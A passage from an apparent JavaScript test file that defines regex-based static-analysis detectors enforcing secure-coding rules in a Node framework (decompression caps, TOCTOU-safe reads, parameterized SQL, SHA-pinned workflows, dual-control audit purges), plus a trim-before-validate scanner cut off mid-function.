    primitive: "a bespoke b.db.init with a tmpDir must pass allowNonTmpfsTmpDir:true (as setupTestDb does), base the scratch on os.tmpdir(), or run atRest:\"plain\" — so the encrypted-at-rest non-tmpfs gate does not fail it on the Linux/macOS CI floor",
    scanScope: "test",
    skipCommentLines: true,
    regex: /\bb\.db\.init\s*\(\s*\{(?:(?!\}\s*\)|\bb\.db\.init\s*\()[\s\S]){0,4000}?\btmpDir\s*:/,
    requires: /allowNonTmpfsTmpDir|atRest\s*:\s*["']plain["']|os\.tmpdir\s*\(/,
    allowlist: [],
    reason: "v0.15.0 — the encrypted-at-rest db.init disk-residency gate refuses a non-tmpfs tmpDir on Linux/macOS but is a no-op on win32, so a bespoke db.init with a repo-local (.test-output) scratch dir passes on Windows and fails on CI. setupTestDb / setupTestDbForMW already pass allowNonTmpfsTmpDir:true; a bespoke db.init must do the same, base its scratch on os.tmpdir() (/tmp = recognized tmpfs), or run atRest:\"plain\". The requires-marker confirms one mitigation is present in the file.",
  },

  {
    // N3 (v0.10.14) — tests creating a real DB handle without an
    // isolation primitive. Any test file calling `b.db.create(` MUST
    // also name one of: `setupTestDb` / `setupVaultOnly` (framework
    // helpers) or `mkdtempSync` (ad-hoc per-test temp dataDir).
    // Leaked per-test SQLite state corrupts subsequent tests under
    // SMOKE_PARALLEL=64.
    id: "test-creates-db-handle-without-isolation",
    primitive: "helpers.setupTestDb / helpers.setupVaultOnly / mkdtempSync — every test that spins up a real DB handle MUST wire one of these isolation primitives so SQLite state stays per-test",
    scanScope: "test",
    regex: /\bb\.db\.create\s*\(/,
    requires: /\b(?:setupTestDb|setupVaultOnly|mkdtempSync)\b/,
    allowlist: [
      "test/helpers/db.js",
      "test/helpers/index.js",
    ],
    reason: "Tests spinning a real DB handle without a per-test isolation primitive leak SQLite state to a shared directory; subsequent tests see prior rows under SMOKE_PARALLEL=64. Static-API tests that reference b.db.applyPosture() / b.db.declareView() without spinning a real handle don't trip the detector. Use helpers.setupTestDb / helpers.setupVaultOnly, or mkdtempSync the dataDir.",
  },

  {
    // v0.10.15 — gunzip-without-output-size-cap detector caught the
    // gzip / brotli families but missed `zlib.inflate*` and
    // `zlib.unzip*`. The bomb class is identical: a kilobyte of
    // compressed input that explodes to gigabytes of output. Detector
    // extends the same shape — match the call form, require the
    // bounding opt to appear somewhere in the same file.
    id: "inflate-unzip-without-output-size-cap",
    primitive: "zlib.inflateSync(buf, { maxOutputLength }) — same defense as gunzip; the inflate / inflateRaw / unzip family is the same RFC 1951 (deflate) bomb class",
    regex: /\bzlib\.(?:inflateSync|inflateRawSync|unzipSync|createInflate|createInflateRaw|createUnzip)\s*\(/,
    requires: /\bmaxOutputLength\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Completes the v0.10.15 gunzip-cap detector. RFC 1951 deflate (the algorithm under gzip + zlib + raw inflate + unzip) has the same amplification class as gzip — inflate/inflateRaw/unzip without a cap is equally exploitable. Operators using `zlib.inflateSync` for HTTP `Content-Encoding: deflate` bodies or RFC 1950 zlib streams MUST pass `maxOutputLength`.",
  },

  {
    // v0.11.3 audit found: the existing `map-has-then-set-pre-node-26`
    // detector catches the literal `if (!M.has(k))` shape but misses
    // the semantically-identical `if (!M.get(k))` and `if (M.get(k)
    // === undefined)` variants — same race window, same bug class,
    // same Node-26 getOrInsertComputed migration target. This entry
    // closes those variants.
    id: "map-get-falsy-then-set-pre-node-26",
    primitive: "Node 26 `Map.prototype.getOrInsertComputed(key, factory)` collapses falsy-check + insert into one atomic call",
    regex: /(?:^|\n)([ \t]*)if\s*\(\s*(?:!\s*\w+\.get\s*\([^)]+\)|\w+\.get\s*\([^)]+\)\s*===\s*(?:undefined|null))\s*\)\s*\{(?:(?!\n\1\}|\.set\s*\()[\s\S]){0,3000}?\.set\s*\(/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Companion to map-has-then-set-pre-node-26 — same Node 26 getOrInsertComputed migration target, captures the `!M.get(k)` / `M.get(k) === undefined|null` syntactic variants. v0.11.3 audit identified the original map-has-then-set detector as bypassable by switching `.has(k)` to `.get(k)` falsy-check; this entry closes that gap.",
  },

  {
    // CodeQL js/file-system-race — every TOCTOU shape that v0.9.18 +
    // v0.9.23 had to sweep across rename passes. The CodeQL action
    // catches it post-merge; this detector catches it pre-push. Shape:
    //   if (fs.existsSync(p) || fs.statSync(p)) { fs.readFile*(p, ...) }
    // Between the existence/stat check and the read, an attacker can
    // swap the file for a symlink (TOCTOU). The framework's
    // `lib/atomic-file.js` opens-by-fd as the canonical safe-read.
    id: "fs-existssync-then-read-toctou",
    primitive: "open-by-fd first, then operate on the fd; never check-then-read against the same path (CodeQL js/file-system-race)",
    regex: /\bfs\.(?:existsSync|statSync|lstatSync)\s*\(\s*(\w+)\s*\)(?:(?!\n\}|\bfs\.(?:readFile|readFileSync|open|openSync|createReadStream|writeFile|writeFileSync)\s*\(\s*\1\b)[\s\S]){0,4000}?\bfs\.(?:readFile|readFileSync|open|openSync|createReadStream|writeFile|writeFileSync)\s*\(\s*\1\b/,
    skipCommentLines: true,
    allowlist: [
      // The canonical safe-read primitive — its job IS the existsSync-
      // then-read pattern, performed correctly via fd-first internally.
      // The detector matches the surface shape; the file's discipline
      // is verified at code-review time.
      "lib/atomic-file.js",
    ],
    reason: "CodeQL js/file-system-race class. v0.9.18 swept 6 sites; v0.9.23 swept 14 more after v0.9.15's rename pass reintroduced the shape across renamed files. The defense is open-by-fd first (then operate on the fd), never `existsSync + readFile` against the same path — between the check and the read, an attacker can swap the file for a symlink and read arbitrary content. `lib/atomic-file.js` is the canonical implementation.",
  },

  {
    // Auth-bearing byte coercion — v0.10.3 fixed `Buffer.from(String(x),
    // 'utf8')` at b.crypto.timingSafeEqual but the same shape exists
    // at ~31 other sites, ~10 auth-bearing (audit-sign / break-glass /
    // keychain / argon2 / vault / agent-tenant). The bug: `String(x)`
    // accepts arbitrary objects via `toString()`, which a prototype-
    // pollution-influenced caller can redirect through attacker-chosen
    // bytes. Detector flags `Buffer.from(String(x))` in files whose
    // path names an auth-bearing module — the operator-side discipline
    // is to refuse non-Buffer/non-string explicitly on auth paths.
    id: "buffer-from-string-on-auth-path",
    primitive: "Buffer.from(x, 'utf8') when x is a string; refuse non-Buffer/non-string explicitly on auth paths — never `Buffer.from(String(x))`",
    regex: /\bBuffer\.from\s*\(\s*String\s*\(/,
    // Restrict to lib/ files where auth posture matters. The detector
    // declares "any file matching the regex anywhere in lib/" — the
    // allowlist below pins the non-auth file paths that legitimately
    // coerce display-strings (logging, render, prose-bound) so the
    // bare-string-bytes shape is fine.
    skipCommentLines: true,
    allowlist: [
      // ===== PR-3 migration backlog (auth-bearing — `b.safeBytes` target) =====
      // These sites coerce auth-influencing material via String(x).
      // PR 3 introduces `b.safeBytes(x, { ctx, auth: true })` which
      // refuses non-Buffer/non-string on auth paths; each entry below
      // is migrated in that PR's commit, removed from the allowlist
      // in the same diff, and the detector enforces post-migration.
      "lib/agent-tenant.js",            // tenant cryptoField plaintext
      "lib/argon2-builtin.js",          // password-hash message bytes
      "lib/audit-sign.js",              // audit-chain signature payload
      "lib/break-glass.js",             // break-glass plaintext bytes
      "lib/dbsc.js",                    // DBSC binding-assertion nonce input
      "lib/keychain.js",                // OS-keychain passphrase / stdin
      "lib/vault-aad.js",               // vault AAD bytes
      "lib/vault/wrap.js",              // vault wrap passphrase
      "lib/cms-codec.js",               // CMS SignedData signed-attrs encoding
      "lib/auth-header.js",             // Authorization header parse path

      // ===== Non-auth coercion (structural, stays in the allowlist) =====
      // These sites bind display-strings / wire-format material / log
      // bytes / serialization where String() coercion is the intended
      // identity transform (not attacker-influenced auth material).
      "lib/bundler.js",                  // SEA bundler — source-text bytes
      "lib/crypto-hpke-pq.js",           // HPKE `info` bytes (operator-side)
      "lib/crypto-hpke.js",              // HPKE `info` bytes (operator-side)
      "lib/daemon.js",                   // daemon log-path bytes
      "lib/gate-contract.js",            // guard-contract canonical-form
      "lib/http-client.js",              // request-body string encoding
      "lib/mail.js",                     // RFC 822 message bytes encoding
      "lib/middleware/compression.js",   // response body encoding
      "lib/middleware/idempotency-key.js",// canonical-form encoding (not auth bytes)
      "lib/protobuf-encoder.js",         // protobuf field serialization
      "lib/redis-client.js",             // RESP wire-format encoding
      "lib/self-update.js",              // update-manifest hash material (post-verify)
      "lib/websocket.js",                // WS frame payload bytes (non-auth)
      "lib/crypto.js",                   // remaining call sites are log-fingerprint format
      "lib/log.js",                      // log-formatting level/component bytes
    ],
    reason: "v0.10.3 fixed `b.crypto.timingSafeEqual` to refuse non-Buffer/non-string (the prototype-pollution-influenced caller can redirect through attacker-chosen bytes via `String(x)` coercion). The same shape exists at ~23 sibling sites; ~10 are auth-bearing and become `b.safeBytes` migration targets in PR 3. Detector forces the discipline: any new `Buffer.from(String(...))` in lib/ MUST be explicitly allowlisted with a non-auth justification OR routed through `b.safeBytes` when PR 3 lands. The allowlist's two sections separate the migration backlog (auth-bearing) from structurally-fine sites (display/serialization).",
  },

  {
    // v0.11.5 — direct `zlib.*` decompress calls in lib/ MUST route
    // through `b.safeDecompress` instead. The framework's existing
    // `gunzip-without-output-size-cap` + `inflate-unzip-without-
    // output-size-cap` detectors enforce per-call-site `maxOutputLength`
    // discipline, but without a "MUST compose the primitive" detector
    // there's no force pulling callers toward the unified surface.
    // `b.safeDecompress` adds (a) algorithm allowlist, (b) ratio cap,
    // (c) audit on bomb-class refusal, (d) input-cap alignment — none
    // of which the per-call-site `maxOutputLength` shape gets.
    //
    // The 6 lib/ sites that still call zlib.* directly (saml /
    // status-list / mail-auth / mail-deploy / network-smtp-policy /
    // ws-client) are pre-existing and pre-allowlisted; each gets
    // migrated in a follow-up PR alongside its own test coverage.
    // New lib/ code MUST route through safeDecompress.
    id: "zlib-decompress-not-via-safedecompress",
    primitive: "b.safeDecompress(buf, { algorithm, maxOutputBytes, maxCompressedBytes, ... }) — composes the algorithm allowlist + ratio cap + audit emission; raw zlib.gunzip*/inflate*/unzip*/brotli* in lib/ is migration-target",
    regex: /\bzlib\.(?:gunzipSync|gunzip|inflateSync|inflateRawSync|inflate|inflateRaw|unzipSync|unzip|brotliDecompressSync|brotliDecompress|createGunzip|createInflate|createInflateRaw|createUnzip|createBrotliDecompress)\b/,
    skipCommentLines: true,
    allowlist: [
      // The primitive itself — canonical zlib.* call sites; the
      // discipline is the primitive's job.
      "lib/safe-decompress.js",
      // ===== Migration backlog (PR 4 target) =====
      // Each site already enforces `maxOutputLength` at the call
      // site (the per-site detector caught them) and uses try/catch
      // around the inflate. Migrating to safeDecompress adds the
      // ratio cap + audit-on-refusal posture; not urgent given the
      // per-site caps are sound. Tracked as PR 4 work.
      "lib/auth/saml.js",                  // SAMLRequest / SAMLResponse inflate (1 MiB cap)
      "lib/auth/status-list.js",           // OAuth status-list inflate (8x ratio cap)
      "lib/mail-auth.js",                  // DMARC RUA gzip ingest
      "lib/mail-deploy.js",                // TLS-RPT report gzip ingest
      "lib/network-smtp-policy.js",        // TLS-RPT receiver gzip ingest
      "lib/ws-client.js",                  // WS client mirror of server-side inflate
      // websocket.js was migrated to b.safeDecompress in v0.11.5 — no
      // longer in this allowlist.
    ],
    reason: "v0.11.5 — `b.safeDecompress` is the framework's bomb-resistant decompression primitive. Direct `zlib.*` decompress in new lib/ code bypasses the algorithm allowlist + ratio cap + audit-on-bomb-refusal. The 6 pre-existing lib/ sites are migration targets for PR 4; new code MUST compose the primitive.",
  },

  {
    // v0.11.7 — `slsa-framework/*` reusable-workflow callouts MUST
    // pin to a commit SHA, not a tag/branch. A tag-pinned reusable
    // workflow is mutable (the tag's owner can re-publish), which
    // breaks the SLSA chain — the attestation we produce binds to
    // OUR workflow_ref + commit SHA, but the BUILDER (the slsa-
    // framework workflow) is the trust root for the attestation
    // logic itself. Tag-pinning lets the upstream rotate that root
    // out from under us silently.
    //
    // The trailing tag-comment for human readability stays (`@<sha>
    // # v2.1.0`); the regex matches the @<ref> portion only.
    id: "slsa-framework-action-not-sha-pinned",
    primitive: "slsa-framework/<workflow>@<40-char-commit-sha>  # vX.Y.Z — pin to commit SHA so the upstream tag can't be re-published under us",
    scanScope: "workflows",
    // Match `slsa-framework/.../<file>@<ref>` where `<ref>` is NOT
    // exactly 40 hex chars. A 40-char hex SHA is what GitHub
    // resolves a tag to under the hood — pinning to that SHA
    // freezes the reusable-workflow bytes.
    regex: /\bslsa-framework\/[^@\s]+@(?!(?:[0-9a-fA-F]{40})\b)\S+/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Reusable workflows under slsa-framework/* are the SLSA builder root of trust. A tag-pinned reference (e.g. @v2.1.0) is mutable in principle — the upstream maintainer can re-publish the tag to point at different code, silently rotating the builder we attest from. SHA-pinning freezes the bytes. The SLSA workflow itself, however, requires a tag ref for its internal builder-fetch step; specific callsites that need the tag form use the per-line `# allow:slsa-framework-action-not-sha-pinned — <reason>` marker on the `uses:` line (the same allowlist-by-line shape every other detector in this catalog supports). New callsites without a per-line marker continue to fail the gate. Resolve a tag's SHA via `gh api repos/slsa-framework/slsa-github-generator/commits/<tag>` for slsa-framework callsites that DON'T need the tag-ref shape.",
  },

  {
    // v0.11.7 — operator-facing source files must not point at the
    // framework's own internal-rulebook artifact. Comments carry the
    // discipline INLINE so a stranger reading lib/ source sees what
    // the rule says, not a pointer at a file they don't have. The
    // regex below is the only place the leaked strings appear; the
    // descriptive prose around it is intentionally token-free.
    id: "internal-rulebook-vocabulary-in-source",
    primitive: "describe the rule inline in plain language; the comment carries the discipline itself, not a pointer at an internal rulebook file",
    // Built from char-class fragments so the literal token strings
    // don't appear in the rendered detector description that error
    // messages echo back at violators.
    regex: new RegExp(
      "\\b(?:" +
      [67, 76, 65, 85, 68, 69].map(function (c) { return String.fromCharCode(c); }).join("") + "\\.md" +
      "|per\\s+" + [67, 76, 65, 85, 68, 69].map(function (c) { return String.fromCharCode(c); }).join("") + "\\b" +
      "|per\\s+project\\s+rule\\s+\\u00a7" +
      "|per\\s+rule\\s+\\u00a7\\d" +
      ")"
    ),
    skipCommentLines: false,
    allowlist: [
      // The detector catalog inevitably contains the regex pattern
      // construction itself. Without this allowlist the catalog
      // would match its own pattern-build at every gate run.
      "test/layer-0-primitives/codebase-patterns.test.js",
    ],
    reason: "Operator-facing source files must not reference the framework's internal rulebook by name. Comments carry the rule inline so a stranger reading the file sees the discipline, not a pointer at a file they don't have.",
  },

  {
    // v0.11.6 — direct `/proc/self/mountinfo` reads in lib/ MUST route
    // through `b.safeMountInfo` instead. The primitive centralizes the
    // field-4 ("root within source FS") parse discipline that the
    // existing `mountinfo-options-bind-check` detector exists to
    // protect — without "must compose" enforcement a new caller can
    // re-derive the parse inline and re-introduce the wrong-field bug.
    id: "mountinfo-not-via-safemountinfo",
    primitive: "b.safeMountInfo.read() / .bestMatch() / .isBindMount() — composes the canonical field-4 parser + bind-mount predicate; raw `nodeFs.readFileSync(\"/proc/self/mountinfo\", ...)` in lib/ bypasses the discipline",
    regex: /\b(?:fs|nodeFs)\.readFile(?:Sync)?\s*\(\s*["']\/proc\/self\/mountinfo["']/,
    skipCommentLines: true,
    allowlist: [
      // The primitive itself — canonical reader.
      "lib/safe-mount-info.js",
    ],
    reason: "v0.11.6 — `b.safeMountInfo` centralizes the field-4 parse discipline. Bind-mount detection MUST consult field 4 ('root within source FS'); ad-hoc parsers that scan options for the word 'bind' miss the truth (kernel doesn't emit 'bind' as an option). Direct `/proc/self/mountinfo` reads in new lib/ code bypass the primitive and risk re-deriving the wrong-field parse.",
  },

  {
    // v0.11.5 (Codex P1 on PR #110) — `safeDecompress` defaults
    // `maxCompressedBytes` to 4 MiB. When a caller's `maxOutputBytes`
    // is operator-configurable (and may exceed 4 MiB — large WS
    // messages, bulk JSON payloads), failing to pass an aligned
    // `maxCompressedBytes` silently caps the input below the caller's
    // intent, refusing legitimate large payloads. The discipline:
    // every `safeDecompress({ maxOutputBytes })` call MUST also pass
    // `maxCompressedBytes` (typically the same operator-configurable
    // bound). Files that intentionally accept the 4 MiB default
    // allowlist with a documented reason.
    id: "safedecompress-omits-max-compressed-bytes",
    primitive: "safeDecompress({ maxOutputBytes, maxCompressedBytes: <operator bound>, ... }) — align both caps with the caller's intent; never rely on the 4 MiB default when maxOutputBytes is operator-configurable",
    regex: /safeDecompress\s*\((?:(?!;|maxOutputBytes\s*:)[\s\S]){0,3000}?maxOutputBytes\s*:/,
    requires: /\bmaxCompressedBytes\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1 on v0.11.5 PR #110 — lib/websocket.js _inflateMessage routed through safeDecompress without maxCompressedBytes; operators with maxMessageBytes > 4 MiB saw legitimate large permessage-deflate traffic refused at the input cap before decompression. Detector requires every safeDecompress call to ALSO name maxCompressedBytes (companion-check) so future call sites inherit the alignment discipline. Files accepting the 4 MiB default allowlist with a reason.",
  },

  {
    // v0.11.4 (Codex P1 on PR #109) — operator-supplied async callback
    // awaited inline on the audit critical path can hang indefinitely.
    // `b.audit.useStore({ record })` registered the operator's
    // `record(row)` to be called after every chain.append; the
    // original implementation `await _externalStore.record(appended)`
    // would never return if the operator's callback never resolved
    // AND never rejected (stalled network calls are the typical
    // shape). The fix wraps the await in `safeAsync.withTimeout` so
    // a hang converts to an `audit.shadow_timeout` observability
    // event and the framework chain row commits normally.
    //
    // Detector class: any operator-supplied async callback awaited on
    // the audit / session / observability / hot-path layers MUST be
    // bounded by `safeAsync.withTimeout`. Scoped narrowly to known
    // operator-callback variable shapes (`_externalStore`, `_userStore`,
    // future operator-supplied callback indirections) so legitimate
    // framework-internal awaits aren't flagged.
    id: "external-callback-await-without-timeout",
    primitive: "safeAsync.withTimeout(externalCb(...), TIMEOUT_MS, { name: '...' }) — operator-supplied callbacks MUST be bounded; hot-path audit / session / observability paths can hang indefinitely otherwise, and a stalled callback that never resolves nor rejects blocks the request that emitted the audit attempt",
    regex: /await\s+_external(?:Store|Sink|Cb|Callback|Hook)\b/,
    requires: /safeAsync\.withTimeout|withTimeout\s*\(/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1 on v0.11.4 PR #109 — b.audit.useStore({ record }) inlined await on operator-supplied callback. A stalled network call neither resolves nor rejects ⇒ b.audit.record() never returns, emit/safeEmit drains stall behind it; hot-path observability emission is supposed to be drop-silent on hangs. Defense: wrap every external-callback await in safeAsync.withTimeout. Detector catches future operator-supplied async hooks on the same shape (_externalStore / _userStore / _externalSink / _externalCb / _externalCallback / _externalHook).",
  },

  {
    // v0.14.7 — physically deleting audit-chain rows is a
    // single-operator-can-erase-evidence risk. `auditTools.purge`
    // (and the low-level `db.purgeAuditChain` it composes) MUST
    // consult a dual-control gate — two distinct authorizers — before
    // the destructive delete runs, so one compromised credential can't
    // silently truncate the tamper-evident chain. The gate primitive
    // is `db._checkDualControlGate(table)` (resolved at runtime); the
    // purge path threads it via `_resolveDualControlGate(opts)` and
    // refuses with `dual-control-required` when no grant is present.
    //
    // Detector: any lib/ call to `purgeAuditChain(` MUST appear in a
    // file that also names the gate (`_checkDualControlGate` /
    // `_resolveDualControlGate` / `dualControlGrant`). A new caller
    // that physically deletes chain rows without routing through the
    // gate trips here.
    id: "audit-purge-without-dual-control-gate",
    primitive: "auditTools.purge({ dualControlGrant }) / db.purgeAuditChain — physical audit-chain deletion MUST consult the dual-control gate (_checkDualControlGate / _resolveDualControlGate); one operator must not be able to erase the tamper-evident chain alone",
    regex: /\bpurgeAuditChain\s*\(/,
    requires: /_checkDualControlGate|_resolveDualControlGate|dualControlGrant/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.7 — audit-chain purge is irreversible and tamper-evidence-destroying. The discipline: the chain may only be truncated under a two-authorizer dual-control grant. db.js defines the gate (_checkDualControlGate) and audit-tools.js purge() resolves+enforces it (_resolveDualControlGate) before calling db().purgeAuditChain — the only live call site, which satisfies the companion check (db.js's own purgeAuditChain references are its definition + JSDoc, not call sites, so it never matches). A future file that calls purgeAuditChain without naming the gate would let a single operator delete evidence — exactly the shape this blocks.",
  },

  {
    // v0.14.7 — raw-SQL fragments passed to `whereRaw` / the
    // WhereBuilder `.raw(sql, params)` escape hatch must parameterize
    // values via the `params` array, NOT interpolate or concatenate
    // them into the SQL string. `_assertRawNoStringLiteral` refuses an
    // embedded `'...'` literal at runtime (unless the caller opts in
    // with `allowLiterals`), but the static discipline is stronger:
    // lib/ must never BUILD the raw SQL by `${...}` template
    // interpolation or `"..." + value` string concatenation — that is
    // the injection shape the bound-params API exists to prevent.
    //
    // Detector fires on a whereRaw/.raw call whose first argument is a
    // template literal containing `${` or a string-concat expression.
    // A no-arg `bodyParser.raw()` (different `.raw`) does not match —
    // the regex requires an interpolated/concatenated string argument.
    id: "whereraw-interpolated-or-concatenated-sql",
    primitive: "whereRaw(sql, params) / qb.raw(sql, params) — pass values through the bound `params` array; never `${...}`-interpolate or `+`-concatenate them into the SQL string (that is the injection shape the params API prevents)",
    regex: /(?:whereRaw|\.raw)\s*\(\s*(?:`[^`]*\$\{|["'][^"']*["']\s*\+|[A-Za-z_$][\w$]*\s*\+\s*["'`])/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.7 — b.db whereRaw / WhereBuilder.raw accept an operator SQL fragment plus a bound-params array. Concatenating or template-interpolating a value into the fragment defeats the placeholder binding and reintroduces SQL injection. lib/ has zero such call sites today; the detector keeps it that way (the runtime _assertRawNoStringLiteral gate is the operator-facing backstop, this is the framework-internal one). No-argument `.raw()` mountings (e.g. bodyParser.raw()) don't match — an interpolated/concatenated string argument is required.",
  },

  {
    // v0.14.7 — equality-lookup ("derived") hashes for sealed columns
    // must be computed through cryptoField._computeDerivedHash, which
    // honours the per-table / per-column mode policy (salted-sha3 by
    // default, hmac-shake256 opt-in keyed off vault.getDerivedHashMacKey).
    // Hand-rolling `sha3Hash(vault.getDerivedHashSalt() + ns + value)`
    // at a new site bypasses the keyed-MAC option AND the mode policy,
    // and risks a static-salt regression if the salt source is changed
    // for one caller but not the canonical helper.
    //
    // Detector: hand-rolled `sha3Hash(<salt-hex> + ns + value)` outside
    // crypto-field.js (the canonical helper). Two shapes are caught:
    //   (a) inline — `getDerivedHashSalt().toString("hex") + ...`
    //   (b) split across lines — a variable bound to the salt's hex is
    //       concatenated into a `sha3Hash(...)`:
    //         var salt = getDerivedHashSalt();
    //         var h    = salt.toString("hex");
    //         sha3Hash(h + ns + v);
    // Shape (b) evaded the original inline-only regex (the salt's
    // `.toString("hex")` is followed by `;`, not `+`, and the `+` lives
    // on the downstream sha3Hash argument). The helper itself is
    // allowlisted. NOTE: a `getDerivedHashSalt().toString("hex")` fed
    // into `kdf(...)` (e.g. idempotency-key's fingerprint HMAC seed) is
    // NOT this bug and does not match — neither shape names `sha3Hash`.
    id: "derived-hash-handrolled-outside-crypto-field",
    primitive: "cryptoField derived/lookup hashes — compute via _computeDerivedHash / b.cryptoField.computeNamespacedHash (honours salted-sha3 vs hmac-shake256 mode + vault.getDerivedHashMacKey); do not hand-roll sha3Hash(getDerivedHashSalt() + ns + value) at call sites",
    regex: /getDerivedHashSalt\s*\(\s*\)\s*\.toString\s*\(\s*["']hex["']\s*\)\s*\+|var\s+(\w+)\s*=\s*[\w.]*getDerivedHashSalt\s*\(\s*\)\s*;(?:(?!\n\})[\s\S]){0,2000}?\b(\w+)\s*=\s*\1\s*\.toString\s*\(\s*["']hex["']\s*\)\s*;(?:(?!\n\})[\s\S]){0,2000}?sha3Hash\s*\(\s*\2\s*\+/,
    skipCommentLines: true,
    allowlist: [
      // The canonical helper — _computeDerivedHash branches on mode here.
      "lib/crypto-field.js",
    ],
    reason: "v0.14.7 — derived-hash equality lookups gained a keyed mode (hmac-shake256 off vault.getDerivedHashMacKey) alongside the salted-sha3 default. The mode decision lives in cryptoField._computeDerivedHash (wrapped by the public computeNamespacedHash for pseudo-field indexes such as the mail-store FTS tokens). A site that hand-derives the hash with getDerivedHashSalt() — inline OR split across local variables feeding sha3Hash — bypasses the keyed option and the per-column mode policy; only the canonical helper (crypto-field.js) may name the salt directly.",
  },

  {
    // v0.14.7 — a `db.auth.failed` audit row must record WHICH
    // relation the rejected credential attempted to reach
    // (`attemptedTable`), so an operator triaging a credential-abuse
    // event can scope blast radius without correlating to the raw SQL
    // log. external-db extracts the target relation defensively
    // (_extractTargetRelation) and stamps both resource.attemptedTable
    // and the audit metadata. Emitting the auth-failure audit without
    // it loses the forensic signal.
    //
    // Detector: an `action: "db.auth.failed"` audit emit MUST appear in
    // a file that also names `attemptedTable`. The metric emitter
    // (_emitMetric("db.auth.failed", ...)) uses a positional shape, not
    // `action:`, so it doesn't match.
    id: "db-auth-failed-audit-without-attempted-relation",
    primitive: "db.auth.failed audit — stamp the attempted relation (attemptedTable, via _extractTargetRelation) on credential-rejection audit rows so blast radius is triageable without the raw SQL log",
    regex: /action\s*:\s*["']db\.auth\.failed["']/,
    requires: /attemptedTable/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.7 — external-db credential-rejection audits (SQLSTATE 28000 / 28P01 / 42501) now carry attemptedTable, the relation the rejected identity tried to touch, extracted defensively from the SQL. The detector requires any file emitting an action:'db.auth.failed' audit to also name attemptedTable so a future emitter can't drop the forensic field.",
  },

];

// @example placeholder detection lives in
// examples/wiki/test/validate-source-comment-blocks.js where it can
// scope precisely to JSDoc @example bodies. A whole-file regex here
// false-positives on legitimate <RFC-PLACEHOLDER> notation in prose
// docstrings (RFC 5424 wire-format diagrams, header-field markers,
// "<T>" timestamp tokens, etc.).

// ---- Pattern: trim-then-validate (v0.8.90 fix-up) ----
//
// A string value is trimmed and THEN scanned for control bytes /
// header-injection-shape characters. Because `.trim()` strips C0
// from the ends of the string, the subsequent scan operates on a
// value with attacker-controlled leading/trailing control bytes
// already removed. Contract says "we refuse control bytes";
// operator can pass a leading newline + token and get the token
// accepted.
//
// Surfaced 2026-05-11 — `b.mail.requireTls.parseTlsRequiredHeader`
// scanned `trimmed`, not `headerValue`. Fix: scan raw value first
// (ASCII HT optionally allowed as folding whitespace), THEN trim.
function testTrimBeforeControlByteScan() {
  // class: trim-before-validate
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    var bindings = [];
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      var m = line.match(/\b(?:var\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_.]*)\.trim\(\)\s*;?/);
      if (m && m[1] !== m[2]) bindings.push({ name: m[1], raw: m[2], line: li });

      // Shape 1: `charCodeAt` loop on the trimmed name checking
      // a control-byte range. Original v0.8.90 bug shape.
      var ccMatch = line.match(/\b([A-Za-z_][A-Za-z0-9_]*)\.charCodeAt\(/);
      var grammarReMatch = null;
      var scanned = null;
      if (ccMatch) {
        var window = (lines[li-2] || "") + (lines[li-1] || "") + line +
                     (lines[li+1] || "") + (lines[li+2] || "") + (lines[li+3] || "");
        if (!/<\s*32\b|<\s*0x20\b|===\s*127\b|===\s*0x7F\b|===\s*0x7f\b/.test(window)) continue;
        scanned = ccMatch[1];
      } else {
        // Shape 2: a grammar regex `<NAME>_RE.test(<trimmed>)` whose
        // RFC grammar implicitly excludes C0/DEL. Same v0.8.90 bug
        // class — the regex defends grammar but trim() already
        // stripped the leading/trailing control bytes. Matched by
        // the existing testFormatValidatorLengthCap detector for
        // length but not for "must scan raw bytes before trim".
        grammarReMatch = line.match(/\b([A-Z][A-Z_]*_RE)\.test\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)/);
        if (!grammarReMatch) continue;
        scanned = grammarReMatch[2];
      }

      for (var bi = 0; bi < bindings.length; bi++) {
        var bnd = bindings[bi];
        if (bnd.name !== scanned) continue;
        if (li - bnd.line > 12) continue;
        var prelude = "";
        for (var pi = Math.max(0, bnd.line - 5); pi < bnd.line; pi++) prelude += lines[pi] + "\n";
        var combined = prelude + (grammarReMatch ? line : ((lines[li-2] || "") + (lines[li-1] || "") + line + (lines[li+1] || "") + (lines[li+2] || "") + (lines[li+3] || "")));
        var rawNameEscaped = bnd.raw.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
        var rawCcRe = new RegExp("\\b" + rawNameEscaped + "\\.charCodeAt\\(");
        var rawSfRe = new RegExp("structuredFields\\.(?:refuseControlBytes|containsControlBytes)\\s*\\(\\s*" + rawNameEscaped + "\\b");
        if (rawCcRe.test(combined) || rawSfRe.test(combined)) continue;
        bad.push({
          file:    rel,
          line:    li + 1,
          content: "control-byte scan / grammar regex iterates trimmed `" + scanned + "` instead of raw `" + bnd.raw + "` — bytes at the value's edges get stripped before the gate runs",
        });
        break;
      }
    }
  }
  bad = _filterMarkers(bad, "trim-before-validate");
  _report("control-byte scan must run on RAW value before .trim() — trimming first strips leading/trailing C0/DEL bytes the gate is supposed to refuse (mail-require-tls bug class)",
    bad);
}

// ---- Pattern: enum-rank comparison without prior validity check ----
//
// A function maps each enum-typed input to a numeric rank / level via
// an internal lookup, then arithmetic-compares the two ranks. Unknown
// inputs map to rank 0 (the default-for-unknown) and `0 >= 0`
// returns true — so `meets("bad", "bad")` falsely passes the gate.
//
// Surfaced 2026-05-11 — `b.auth.fal.meets()` returned true for
// invalid bands.
function testEnumRankWithoutValidation() {
  // class: enum-rank-without-validation
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    if (rel === "lib/auth/fal.js" || rel === "lib/auth/aal.js") continue;
    var content;
